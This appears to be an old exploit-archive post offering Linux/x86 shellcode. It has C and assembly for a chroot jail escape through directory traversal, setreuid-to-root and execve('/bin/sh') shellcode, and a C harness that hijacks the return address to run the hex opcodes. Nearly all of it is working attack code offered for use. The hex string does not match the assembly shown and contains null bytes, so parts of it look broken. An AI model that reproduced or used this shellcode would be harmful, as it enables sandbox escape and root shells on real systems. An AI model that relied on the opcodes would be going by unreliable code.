/*
 Linux/x86 chroot and standart shellcode.
 By Okti (http://okti.nm.ru)

 ----------------------------------------------------------------------------------------------
*/

 /* Mkdir and Chroot are written in C: */

 #include<stdio.h>
 #include<unistd.h>
 #include<sys/types.h>
 #include<sys/stat.h>
 int main(void) {

        mkdir("sh", 0);
        chown("sh", 0, 0);
        chmod("sh", S_IRUSR | S_IWUSR);
        chroot("sh");
	/* But many '../' as possible, i'm to lazy to add comments ;) */
        chroot("../../../../../../../../../../../../../../../../../../../../../../../../");
 }

 ----------------------------------------------------------------------------------------------

 Asm version of the above C code:

 ----------------------------------------------------------------------------------------------

 	.file	"y.c"
	.section	.rodata
.LC0:
	.string	"sh"
	.align 4
.LC1:
	.string	"../../../../../../../../../../../../../../../../../../../../"
	.text
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	subl	%eax, %esp
	subl	$8, %esp
	pushl	$0
	pushl	$.LC0
	call	mkdir
	addl	$16, %esp
	subl	$4, %esp
	pushl	$0
	pushl	$0
	pushl	$.LC0
	call	chown
	addl	$16, %esp
	subl	$8, %esp
	pushl	$384
	pushl	$.LC0
	call	chmod
	addl	$16, %esp
	subl	$12, %esp
	pushl	$.LC0
	call	chroot
	addl	$16, %esp
	subl	$12, %esp
	pushl	$.LC1
	call	chroot
	addl	$16, %esp
	leave
	ret
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.1 (Mandrakelinux 10.1 3.4.1-4mdk)"

 ------------------------------------------------------------------------------------------------

 Standart setreuid and execve shellcode (66 bytes).
 It is all clean and tidy, uses 'pop' and 'push', to get string '/bin/sh' from data segment,
 no null bytes.
 For details, compile this asm code with: nasm -f elf shell.asm then ld shell.o and ./a.out

 ------------------------------------------------------------------------------------------------

  section .data

  db '/bin/sh'
  global _start

  _start:

 ; setruid(uid_t ruid, uid_t euid)

  xor eax, eax
  mov al, 70
  xor ebx, ebx
  xor ecx, ecx
  int 0x80

 jmp two
 one:
  pop ebx

 ; execve(const char *filename, char *const argv[], char *const envp[])

  xor eax, eax
  mov [ebx+7], al
  mov [ebx+8], ebx
  mov [ebx+12], eax
  mov al, 11
  lea ecx, [ebx+8]
  lea edx, [ebx+12]
  int 0x80

  two:
  call one
  db '/bin/sh'

 ---------------------------------------------------------------------------------------------------

 Hex opcodes of the mkdir chroot and above shellcode asm instructions (in C).

 ---------------------------------------------------------------------------------------------------

 #include<stdio.h>
 #include<stdlib.h>
 int main() {

        int *ret;
        long offset = 4;
        char star[] =
        "\x89\xda\x8b\x4c\x24\x08\x8b\x5c\x24\x04\xb8\x27\x00\x00\x00\xcd\x80"
        "\x89\xda\x8b\x5c\x24\x04\xb8\x3d\x00\x00\x00\xcd\x80"
        "\x2f\x62\x69\x6e\x2f\x73\x68\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd"
        "\x80\xe9\x16\x00\x00\x00\x5b\x31\xc0\x88\x43\x07\x89\x58\x08\x89"
        "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68";

        *((int * ) &ret + offset) = (int) star;
 }


// milw0rm.com [2005-07-11]